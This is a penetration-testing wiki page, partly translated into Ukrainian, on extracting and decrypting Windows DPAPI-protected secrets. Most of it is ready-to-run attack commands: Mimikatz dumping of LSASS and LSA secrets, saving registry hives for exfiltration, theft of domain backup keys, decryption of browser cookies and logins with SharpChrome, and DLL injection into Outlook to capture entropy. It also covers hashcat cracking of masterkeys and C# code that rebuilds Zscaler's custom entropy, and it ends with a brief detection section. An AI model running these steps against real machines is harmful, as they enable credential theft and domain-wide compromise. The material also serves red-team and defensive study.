# DPAPI - Вилучення паролів

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.

Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.

### Генерація ключів користувача

The DPAPI generates a unique key (called **`pre-key`**) for each user based on their credentials. This key is derived from the user's password and other factors and the algorithm depends on the type of user but ends being a SHA1. For example, for domain users, **it depends on the NTLM hash of the user**.

This is specially interesting because if an attacker can obtain the user's password hash, they can:

- **Decrypt any data that was encrypted using DPAPI** with that user's key without needing to contact any API
- Try to **crack the password** offline trying to generate the valid DPAPI key

Moreover, every time some data is encrypted by a user using DPAPI, a new **master key** is generated. This master key is the one actually used to encrypt data. Each master key is given with a **GUID** (Globally Unique Identifier) that identifies it.

The master keys are stored in the **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, where `{SID}` is the Security Identifier of that user. The master key is stored encrypted by the user's **`pre-key`** and also by a **domain backup key** for recovery (so the same key is stored encrypted 2 times by 2 different pass).

Note that the **domain key used to encrypt the master key is in the domain controllers and never changes**, so if an attacker has access to the domain controller, they can retrieve the domain backup key and decrypt the master keys of all users in the domain.

The encrypted blobs contain the **GUID of the master key** that was used to encrypt the data inside its headers.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Знайти master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Генерація ключа Machine/System

Це ключ, який використовується машиною для шифрування даних. Він базується на **DPAPI_SYSTEM LSA secret**, який є спеціальним ключем, до якого може отримати доступ лише користувач SYSTEM. Цей ключ використовується для шифрування даних, які мають бути доступні самій системі, наприклад облікові дані на рівні машини або системні секрети.

Зверніть увагу, що ці ключі **не мають domain backup**, тому вони доступні лише локально:

- **Mimikatz** може отримати до них доступ, дампуючи LSA secrets за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається в реєстрі, тож адміністратор може **змінити дозволи DACL, щоб отримати до нього доступ**. Шлях у реєстрі: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction from registry hives is also possible. For example, as an administrator on the target, save the hives and exfiltrate them:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Потім на вашій analysis box відновіть DPAPI_SYSTEM LSA secret з hives і використайте його для розшифрування machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles тощо):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Захищені дані DPAPI

Серед персональних даних, захищених DPAPI, є:

- Windows creds
- Паролі Internet Explorer та Google Chrome і дані автозаповнення
- Паролі електронної пошти та внутрішніх FTP-акаунтів для застосунків, таких як Outlook та Windows Mail
- Паролі для спільних папок, ресурсів, бездротових мереж та Windows Vault, включно з ключами шифрування
- Паролі для підключень Remote Desktop, .NET Passport та приватні ключі для різних цілей шифрування й автентифікації
- Мережеві паролі, що керуються Credential Manager, та персональні дані в застосунках, які використовують CryptProtectData — наприклад Skype, MSN messenger тощо
- Зашифровані блоби в реєстрі
- ...

Системні захищені дані включають:
- Паролі Wi-Fi
- Паролі для запланованих завдань
- ...

### Master key extraction options

- Якщо користувач має привілеї domain admin, він може отримати доступ до **domain backup key** щоб розшифрувати всі user master keys у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- За наявності локальних привілеїв адміністратора можна **отримати доступ до пам'яті LSASS**, щоб витягти DPAPI master keys усіх підключених користувачів та ключ SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має локальні права адміністратора, вони можуть отримати доступ до **DPAPI_SYSTEM LSA secret** для дешифрування machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо відомий пароль користувача або NTLM-hash, ви можете **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви перебуваєте в сесії від імені користувача, можна звернутися до DC за **backup key to decrypt the master keys using RPC**. Якщо ви local admin і користувач увійшов у систему, ви можете **steal his session token** для цього:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Перелік сховищ
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Знайти зашифровані дані DPAPI

Типові **захищені файли** користувачів знаходяться в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Check also changing `\Roaming\` to `\Local\` in the above paths.

Приклади енумерації:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити DPAPI encrypted blobs у файловій системі, реєстрі та B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зауважте, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того ж репозиторію) можна використовувати для дешифрування за допомогою DPAPI конфіденційних даних, таких як cookies.

#### Chromium/Edge/Electron швидкі рецепти (SharpChrome)

- Для поточного користувача — інтерактивне дешифрування збережених логінів/cookies (працює навіть з Chrome 127+ app-bound cookies, оскільки додатковий ключ витягується з Credential Manager користувача під час запуску в user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Офлайн-аналіз, якщо у вас є лише файли. Спочатку витягніть AES state key з профілю "Local State", а потім використайте його для розшифровки cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Перевірка в масштабі домену або віддалена, коли у вас є DPAPI domain backup key (PVK) та права адміністратора на цільовому хості:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Якщо у вас є DPAPI prekey/credkey користувача (з LSASS), ви можете пропустити password cracking і безпосередньо розшифрувати дані профілю:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notes
- Новіші збірки Chrome/Edge можуть зберігати певні cookie з використанням "App-Bound" encryption. Офлайн-розшифрування цих конкретних cookie неможливе без додаткового app-bound key; запустіть SharpChrome в контексті цільового користувача, щоб отримати його автоматично. Див. допис у блозі з безпеки Chrome, згаданий нижче.

### Access keys and data

- **Use SharpDPAPI** для отримання облікових даних з файлів, зашифрованих DPAPI, з поточної сесії:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримати інформацію про credentials** (наприклад, зашифровані дані та guidMasterKey).
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Розшифруйте masterkey користувача, який запитує **domain backup key**, використовуючи RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для дешифрування masterkey (зверніть увагу, що можна використовувати `/rpc` для отримання domains backup key, `/password` для використання plaintext password або `/pvk` для вказання DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрувати дані за допомогою masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для дешифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що можна використовувати `/rpc` для отримання доменного резервного ключа, `/password` для використання пароля у відкритому тексті, `/pvk` щоб вказати файл приватного ключа DPAPI домену, `/unprotect` щоб використати сесію поточного користувача...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Використання DPAPI prekey/credkey безпосередньо (пароль не потрібен)

Якщо ви можете dump LSASS, Mimikatz часто виявляє per-logon DPAPI key, який можна використати для розшифрування user’s masterkeys без знання plaintext password. Передайте це значення безпосередньо в tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Дешифрувати деякі дані, використовуючи **поточний сеанс користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Офлайн-розшифрування за допомогою Impacket dpapi.py

Якщо у вас є SID і пароль користувача-жертви (або NT hash), ви можете повністю офлайн розшифрувати DPAPI masterkeys та Credential Manager blobs за допомогою Impacket’s dpapi.py.

- Виявити артефакти на диску:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Відповідний masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Якщо інструменти передачі файлів ненадійні, закодуйте файли у base64 на хості та скопіюйте вивід:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Розшифрувати masterkey за допомогою SID користувача та пароля/хешу:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Використайте розшифрований masterkey для розшифрування credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Цей робочий процес часто відновлює доменні облікові дані, збережені програмами, що використовують Windows Credential Manager, включно з обліковими записами адміністратора (наприклад, `*_adm`).

---

### Обробка необов'язкової ентропії ("Third-party entropy")

Деякі додатки передають додаткове значення **ентропії** до `CryptProtectData`. Без цього значення blob не може бути розшифрований, навіть якщо відомий правильний masterkey. Тому отримання ентропії є необхідним при націлюванні на облікові дані, захищені таким чином (наприклад, Microsoft Outlook, деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — це user-mode DLL, яка перехоплює функції DPAPI всередині цільового процесу та прозоро записує будь-яку опціональну ентропію, що надається. Запуск EntropyCapture у режимі **DLL-injection** проти процесів, як-от `outlook.exe` або `vpnclient.exe`, згенерує файл, який зіставляє кожен буфер ентропії з процесом-викликачем та blob. Зафіксовану ентропію згодом можна передати в **SharpDPAPI** (`/entropy:`) або **Mimikatz** (`/entropy:<file>`) для розшифрування даних.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft представила формат masterkey **context 3** починаючи з Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) додав hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) і **22102** (context 3), що дозволяє виконувати GPU-accelerated cracking паролів користувачів безпосередньо з файлу masterkey. Отже, зловмисники можуть виконувати word-list або brute-force attacks без взаємодії з цільовою системою.

`DPAPISnoop` (2024) автоматизує процес:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Інструмент також може розбирати Credential and Vault blobs, розшифровувати їх за допомогою зламаних ключів і експортувати паролі у відкритому вигляді.

### Доступ до даних іншої машини

У **SharpDPAPI and SharpChrome** можна вказати опцію **`/server:HOST`** для доступу до даних віддаленої машини. Звісно, потрібно мати доступ до тієї машини, і в наведеному прикладі передбачено, що **відомий ключ шифрування резервного копіювання домену**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — інструмент, який автоматизує витяг усіх користувачів і комп'ютерів з LDAP-каталогу та отримання ключа резервної копії контролера домену через RPC. Скрипт потім визначає IP-адреси всіх комп'ютерів і виконує smbclient на всіх комп'ютерах, щоб отримати всі DPAPI blobs усіх користувачів і розшифрувати їх за допомогою ключа резервної копії домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Отримавши зі списку комп'ютерів із LDAP, ви можете знайти кожну підмережу, навіть якщо раніше не знали про них!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично дампити секрети, захищені DPAPI. Реліз 2.x представив:

* Паралельний збір blobs з сотень хостів
* Парсинг **context 3** masterkeys та автоматична інтеграція зі злому через Hashcat
* Підтримка шифрованих cookie Chrome "App-Bound" (див. наступний розділ)
* Новий режим **`--snapshot`** для повторного опитування кінцевих точок і порівняння щойно створених blob-ів

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — C# парсер для файлів masterkey/credential/vault, який може виводити формати для Hashcat/JtR і за бажанням автоматично запускати злому. Повністю підтримує машинні та користувацькі формати masterkey до Windows 11 24H1.


## Типові виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших директоріях, пов'язаних з DPAPI.
- Особливо з мережевого шару на кшталт **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних інструментів для доступу до пам'яті LSASS або дампу masterkey-ів.
- Подія **4662**: *An operation was performed on an object* – може корелюватися з доступом до об'єкта **`BCKUPKEY`**.
- Події **4673/4674**, коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Уразливості та зміни екосистеми 2023–2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (листопад 2023). Атакуючий з доступом до мережі міг обдурити членa домену, щоб той отримав зловмисний DPAPI backup key, що дозволяло розшифрувати користувацькі masterkey-и. Виправлено в кумулятивному оновленні листопада 2023 — адміністраторам слід переконатися, що DC та робочі станції повністю оновлені.
* **Chrome 127 “App-Bound” cookie encryption** (липень 2024) замінила спадковий захист лише через DPAPI додатковим ключем, який зберігається в **Credential Manager** користувача. Оффлайн-розшифровка cookie тепер вимагає як DPAPI masterkey, так і **GCM-wrapped app-bound key**. SharpChrome v2.3 та DonPAPI 2.x можуть відновити додатковий ключ при запуску в контексті користувача.


### Приклад: Zscaler Client Connector – кастомна ентропія, похідна від SID

Zscaler Client Connector зберігає декілька конфігураційних файлів у `C:\ProgramData\Zscaler` (наприклад `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожний файл зашифрований з допомогою **DPAPI (Machine scope)**, але постачальник додає **custom entropy**, яка *обчислюється під час виконання* замість того, щоб зберігатися на диску.

Ентропію відновлюють із двох елементів:

1. Жорстко закодований секрет, вбудований у `ZSACredentialProvider.dll`.
2. **SID** облікового запису Windows, якому належить конфігурація.

Алгоритм, реалізований у DLL, еквівалентний:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Оскільки секрет вбудовано в DLL, яку можна прочитати з диска, **будь-який локальний зловмисник з правами SYSTEM може відтворити entropy для будь-якого SID** і decrypt the blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Розшифрування повертає повну JSON-конфігурацію, включно з кожним **device posture check** та його очікуваним значенням — інформація, яка дуже цінна при спробах client-side bypasses.

> Порада: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені за допомогою DPAPI **без** ентропії (`16` нульових байтів). Тому їх можна безпосередньо розшифрувати за допомогою `ProtectedData.Unprotect`, щойно будуть отримані привілеї SYSTEM.

## Посилання

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
